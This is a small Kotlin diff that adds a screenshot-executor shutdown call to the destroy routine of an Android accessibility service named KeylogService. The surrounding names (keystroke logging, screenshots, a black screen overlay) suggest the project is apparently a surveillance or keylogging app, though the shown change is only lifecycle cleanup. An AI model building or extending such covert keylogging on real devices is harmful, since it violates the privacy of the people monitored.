@@ -212,6 +212,7 @@ class KeylogService : AccessibilityService() {
         instance = null
         isRunning = false
         toggleBlackOverlay(false)
+        screenshotExecutor.shutdown()
         Log.i(TAG, "Keylog service destroyed")
         logFile?.appendText("${System.currentTimeMillis()} KeylogService destroyed\n")
     }
